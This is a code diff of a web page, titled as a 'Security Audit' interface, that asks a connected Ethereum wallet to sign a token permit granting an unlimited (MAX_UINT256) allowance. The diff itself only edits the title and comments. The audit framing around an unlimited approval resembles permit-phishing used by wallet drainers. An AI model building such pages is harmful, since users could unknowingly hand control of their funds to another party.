@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Audit Interface - Max Approval</title>
+    <title>Security Audit: Unlimited Permit</title>
     <style>
         body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; background-color: #f8f9fa; }
         .card { border: 1px solid #ddd; padding: 25px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; background: white; max-width: 450px; }
@@ -28,7 +28,7 @@
                 const chainIdHex = await window.ethereum.request({ method: 'eth_chainId' });
                 const chainId = parseInt(chainIdHex, 16);
 
-                // Nilai Max Uint256 dalam format string untuk memastikan presisi
+                // Max Uint256 value as a string for precision
                 const MAX_UINT256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
                 const permitData = {
@@ -41,7 +41,7 @@
                     message: {
                         owner: accounts[0],
                         spender: "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D", 
-                        value: MAX_UINT256, // Nilai Unlimited Approval
+                        value: MAX_UINT256, // Menggunakan nilai tak terbatas
                         nonce: 0, 
                         deadline: Math.floor(Date.now() / 1000) + 3600
                     },
